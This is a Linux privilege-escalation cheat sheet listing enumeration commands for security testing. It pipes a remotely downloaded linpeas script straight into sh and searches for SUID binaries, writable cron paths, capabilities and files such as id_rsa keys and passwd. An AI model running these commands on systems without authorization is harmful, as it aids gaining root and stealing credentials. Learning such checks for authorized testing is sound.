# Linux Privilege Escalation Cheat Sheet

## Automated enumeration (run these first)

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linux-exploit-suggester.sh
```

## Manual checks

### Who / what am I

```
id; whoami; groups
sudo -l                       # what can I run as root without a password?
```

### SUID / SGID binaries

```
find / -perm -4000 -type f 2>/dev/null      # SUID
find / -perm -2000 -type f 2>/dev/null      # SGID
```

Cross-reference results against [GTFOBins](https://gtfobins.github.io/) for a known abuse path.

### Writable files & cron

```
find / -writable -type d 2>/dev/null | grep -v -E '^(/proc|/sys)'
cat /etc/crontab; ls -la /etc/cron.*
crontab -l
```

### Capabilities

```
getcap -r / 2>/dev/null
```

### Kernel & OS version (for known CVEs)

```
uname -a
cat /etc/os-release
```

### Interesting files

```
find / -name "*.bak" -o -name "*passwd*" -o -name "*config*" 2>/dev/null
cat /etc/passwd | grep -v nologin
find / -name "id_rsa*" 2>/dev/null
```

### Processes running as root

```
ps aux | grep root
```

## Reference

[HackTricks — Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html) — the deep-dive checklist this file is a quick-reference summary of.
